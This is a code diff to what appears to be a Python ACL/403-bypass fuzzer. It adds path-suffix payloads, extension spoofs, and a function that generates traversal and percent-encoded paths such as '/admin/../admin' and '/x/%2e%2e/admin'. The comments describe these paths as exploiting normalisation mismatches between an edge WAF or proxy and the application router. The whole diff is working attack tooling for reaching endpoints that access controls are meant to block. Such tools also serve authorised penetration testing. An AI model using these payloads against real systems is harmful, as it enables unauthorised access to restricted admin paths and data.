@@ -93,7 +93,13 @@ _NAMED_HEADERS = {
 _SUFFIXES = (
     "/", "/.", "//", "/./", "%20", "%09", "%00", "%0a", "%0d", "%2f", "%252f",
     "..;/", ";/", "/..;/", ".;/", "..%2f", "%5c", "?", "~", "/*",
-    ".json", ".html", ".css", ".php", ".aspx", ".xml",
+    # bare trailing dot/dots/semicolon and "/.." — a proxy may strip/collapse these
+    # differently than the app, so the ACL and the router disagree on the target.
+    "..", ";", ".", "/..", "/%2e/", "/%2e%2e/",
+    # extension spoofs — content-negotiation / extension routing can reach the same
+    # controller past an ACL bound to the extensionless path.
+    ".json", ".html", ".css", ".php", ".aspx", ".xml", ".js", ".txt",
+    ";.json", ".json;",
 )
 
 # Prefix/mid forms — operate on the body (path without the leading slash). The
@@ -183,6 +189,25 @@ def _pct2(c: str) -> str:
     return f"%25{ord(c):02X}"
 
 
+def _traversal_resolve_variants(p: str) -> list[tuple[str, str]]:
+    """Paths that NORMALIZE back to `p` but present a different literal string to a
+    front-end WAF/proxy — `/admin/../admin`, `/x/../admin`. The edge matches its
+    ACL against the raw string (no `/admin`), then the app server collapses the
+    traversal and routes to `/admin` anyway. Encoded and double-encoded `..` too,
+    for filters that decode before vs after the ACL. Returns (label, request_path)."""
+    core = "/" + p.strip("/")
+    seg = core.rsplit("/", 1)[-1]
+    if not seg:
+        return []
+    return [
+        ("path traverse-self /../", f"{core}/../{seg}"),           # /admin/../admin
+        ("path traverse-self /%2e%2e/", f"{core}/%2e%2e/{seg}"),   # encoded ..
+        ("path traverse-self /%252e%252e/", f"{core}/%252e%252e/{seg}"),  # double-encoded ..
+        ("path traverse-prefix /x/..", f"/x/..{core}"),            # /x/../admin (bogus dir + up)
+        ("path traverse-prefix /x/%2e%2e", f"/x/%2e%2e{core}"),    # …encoded
+    ]
+
+
 def _char_encode_variants(p: str) -> list[tuple[str, str]]:
     """Percent-encode individual path characters so a WAF/ACL matching the literal
     word (`/admin`) misses while the server still decodes back to it — the "encode
@@ -268,6 +293,10 @@ def variants(path: str, case_insensitive: bool = False,
     # character percent-encoding — encode a path letter (last/first/whole, single
     # and double) so a WAF regex on the literal word misses; the server decodes.
     for label, rpath in _char_encode_variants(p):
+        add(label, "GET", rpath, {})
+    # traversal that resolves back to the target (/admin/../admin, /x/../admin) —
+    # exploits normalization differences between the edge ACL and the app router.
+    for label, rpath in _traversal_resolve_variants(p):
         add(label, "GET", rpath, {})
 
     # --- header injection (same path) ---
